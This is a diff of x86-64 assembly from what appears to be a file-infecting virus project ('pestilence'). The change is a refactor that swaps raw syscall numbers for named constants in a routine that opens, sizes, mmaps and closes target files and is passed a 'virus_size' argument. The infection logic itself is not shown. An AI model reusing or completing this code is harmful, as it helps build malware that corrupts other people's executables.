@@ -1,30 +1,33 @@
+%define TREAT_FILE_S
+%include "pestilence.lst"
+
 section .text
 	global _treat_file
 	global _final_end
-	extern _update_mmaped_file
-	extern _string
-	extern _ft_strlen
-	extern _thread_create
-	extern _decrypt
-	extern _end_decrypt
+;	extern _update_mmaped_file
+;	extern _string
+;	extern _ft_strlen
+;	extern _thread_create
+;	extern _decrypt
+;	extern _end_decrypt
 
 _file_size:
 	enter 24, 0
 ; lseek to start of file
 	xor rax, rax
-	mov rax, 8
+	mov rax, SYS_LSEEK
 	mov rsi, 0
 	mov rdx, 0
 	syscall
 ; lseek to end of file
-	mov rax, 8
+	mov rax, SYS_LSEEK
 	mov rsi, 0
 	mov rdx, 2
 	syscall
 ; store the return value, it's the offset of EOF. So it's the file size
 ; lseek to start of file again
 	mov QWORD [rsp], rax
-	mov rax, 8
+	mov rax, SYS_LSEEK
 	mov rsi, 0
 	mov rdx, 0
 	syscall
@@ -102,7 +105,7 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 ; open file
 	mov rdi, rsp
 	sub rdi, QWORD [rsp + 96]
-	mov rax, 2
+	mov rax, SYS_OPEN
 	mov rsi, 2
 	xor rdx, rdx
 		mov r10, QWORD [rsp + 96]
@@ -131,7 +134,7 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 
 ;;;;;;;;;;;;;;;;;
 ; mmap file
-	mov rax, 9
+	mov rax, SYS_MMAP
 	mov rdi, 0
 	mov rsi, QWORD [rsp + 16]
 	mov rdx, 3
@@ -273,14 +276,14 @@ _call_mmaped_update:
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
 _munmap:
-	mov rax, 11
+	mov rax, SYS_MUNMAP
 	mov rdi, QWORD [rsp + 24]
 	mov rsi, QWORD [rsp + 16]
 	syscall
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; close file
 _close_file:
-	mov rax, 3
+	mov rax, SYS_CLOSE
 	mov rdi, QWORD [rsp]
 	syscall
 	mov rax, QWORD [rsp + 104]
@@ -310,3 +313,5 @@ _not_ok_end:
 _final_end:
 	leave
 	ret
+
+%undef TREAT_FILE_S
